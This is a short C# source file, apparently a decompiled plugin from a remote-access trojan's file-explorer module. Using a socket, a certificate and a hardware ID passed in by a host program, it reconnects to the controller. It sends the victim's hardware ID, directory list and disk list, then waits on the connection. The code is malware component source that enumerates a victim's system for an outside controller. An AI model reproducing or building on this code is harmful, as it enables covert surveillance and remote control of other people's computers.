using System.Collections.Generic;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			Client.Send(LEB128.Write(new object[5]
			{
				"Explorer",
				"Connect",
				hwid,
				string.Join(",", (IEnumerable<string?>)Methods.GetVariablesDirs()),
				string.Join(",", (IEnumerable<string?>)Methods.Disk())
			}));
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		FileWatcher.Stop();
		Thread.Sleep(5000);
	}
}
